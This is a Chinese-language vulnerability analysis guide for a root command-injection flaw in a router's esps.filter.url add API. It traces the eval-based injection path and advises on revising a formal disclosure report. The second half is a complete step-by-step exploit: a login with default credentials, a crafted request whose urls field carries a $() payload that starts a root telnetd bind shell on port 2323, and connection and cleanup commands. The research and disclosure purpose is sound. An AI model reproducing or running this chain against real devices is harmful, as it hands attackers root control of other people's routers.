# `esps.filter.url.add` Root RCE 分析指导与正式稿修改建议

## 1. 用途

这份文档配套：

- `report/postauth_esps_filter_url_rce_report.md`

重点说明这条链的真实触发条件、代码落点，以及正式稿里需要补强的细节。

## 2. 一句话结论

这条漏洞不是“所有 `add` 请求都能 RCE”，而是：

```text
/api/esps
  -> 认证后进入 /www/api FCGI_EspsProcess
  -> protol_cvt.lua + magic_link.lua 直接转发到 ubus
  -> esps.filter.url add
  -> 当 mode 非空时走定时 URL 规则分支
  -> urls[] 进入 eval 赋值
  -> add_Urls 再次通过 eval echo 取值
  -> $() 命令替换执行
```

所以正式稿里必须把“`mode` 非空才走到危险分支”写清楚。

## 3. 关键静态证据

### 3.1 `/api/esps` 是原始 ubus 转发器

`/www/api`：

- `main` 中 `/esps` 在认证后进入 `FCGI_EspsProcess`
- `FCGI_EspsProcess` 反编译显示：
  - `0x405078` 读取 HTTP body
  - `0x4050dc` 拼接 `lua /usr/lib/lua/protol_cvt.lua magic_link '<body>'`
  - `0x405424` 通过 `popen` 执行

`/usr/lib/lua/protol_cvt.lua`：

- `25-27`：JSON 解码
- `50-56`：`magic_link` 模式
- `77`：`find_ubus_cmd`
- `89`：`ubus.connect()`
- `117`：`conn:call(...)`

`/usr/lib/lua/magic_link/magic_link.lua`：

- `12-25`：把外部 `object/method/param` 直接映射为 ubus `path/func/args`

### 3.2 危险点在 `mode` 非空的 `add` 子路径

`/usr/libexec/rpcd/esps.filter.url`：

- `282-317`：进入 `add)` 分支并读取 `status/description/mode`
- `318`：`if [ -z "${mode}" ];then`
- `376-389`：当 `mode` 非空时，解析 `urls[]` 并执行

```sh
json_get_var urlsStr ${idx}
eval urlsStr"${idx}"="${urlsStr}"
```

- `472`：调用 `add_Urls`
- `105-110`：`add_Urls` 中再次执行

```sh
uci add_list urlfilter.rule"${_id}".urls="$(eval echo '$'"urlsStr${_idx}")"
```

因此 `$()` 既可能在第一次 `eval` 赋值时执行，也可能在后续取值时再次参与展开。

## 4. 当前正式稿最应该补的点

### 4.1 不要把根因写得过泛

当前正式稿写“`urls[]` reaches eval assignment”方向没错，但建议进一步强调：

- 只有 `mode` 非空时才进入危险分支；
- PoC 之所以设置 `mode="white"`，就是为了强制走这条分支。

### 4.2 要说明这是调度规则分支

该分支不仅处理 `urls`，还会处理：

- `weekdays`
- `timeRange`

这说明它是“带时间策略的 URL 过滤规则”分支，而不是普通 URL 列表分支。

### 4.3 建议补手工请求

正式稿里应给出一份包含：

- 登录请求
- `AUTHENTICATION` 头
- `mode: "white"`
- `urls: ["$(...)"]`

的手工复现包。

## 5. 建议补充的验证点

1. 先登录拿 session；
2. 发送 `esps.filter.url.add`；
3. 连接临时 `telnetd` 证明 root；
4. 调用 `esps.filter.url.getlist` 查看新增规则；
5. 若需要，再 `delete` 清理。

## 6. 结论性写法建议

建议在正式稿里直接点明：

> The command-injection path is reached in the scheduled-rule branch of `esps.filter.url.add`, where a non-empty `mode` causes `urls[]` elements to be copied through `eval` and later expanded again when building UCI list entries.

## 7. BurpSuite 逐步复现

约定：

- 目标：`192.168.8.1`
- 默认账号：`admin / admin123`
- 临时 shell 端口：`2323`
- 规则描述：`urlfilter_rce_burp_2323`

### 7.1 包 1：登录获取 session

```http
POST /api/login/auth HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{"username":"admin","password":"admin123"}
```

从响应中取：

- `data.session`

后续写入：

- `AUTHENTICATION: <SESSION>`

### 7.2 包 2：触发 `esps.filter.url.add`

这一步关键是：

- `mode` 必须非空，这里用 `white`
- `urls[0]` 放 `$()` payload

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"esps.filter.url","method":"add","param":{"status":"enable","urls":["$(echo URLFILTER_RCE_OK >/tmp/urlfilter_rce_marker; /usr/sbin/telnetd -p 2323 -l /bin/sh >/dev/null 2>&1 &)"],"description":"urlfilter_rce_burp_2323","macs":[],"mode":"white","weekdays":[],"timeRange":[]}}]
```

### 7.3 第 3 步：连接 shell 验证 root

等 1-2 秒后连接：

```bash
telnet 192.168.8.1 2323
```

或：

```bash
nc 192.168.8.1 2323
```

连接后执行：

```sh
id
uname -a
cat /tmp/urlfilter_rce_marker
```

预期看到：

```text
uid=0(root)
URLFILTER_RCE_OK
```

### 7.4 包 3：读取规则列表，定位刚写入的规则

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"esps.filter.url","method":"getlist","param":{}}]
```

在返回里找到：

- `description = "urlfilter_rce_burp_2323"`
- 对应的 `id`

### 7.5 包 4：清理规则

把上一步拿到的 `<RULE_ID>` 填进去：

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"esps.filter.url","method":"delete","param":{"list":[<RULE_ID>]}}]
```

### 7.6 清理 shell

在拿到的 shell 里执行：

```sh
ps w | grep 'telnetd -p 2323'
kill <PID>
```
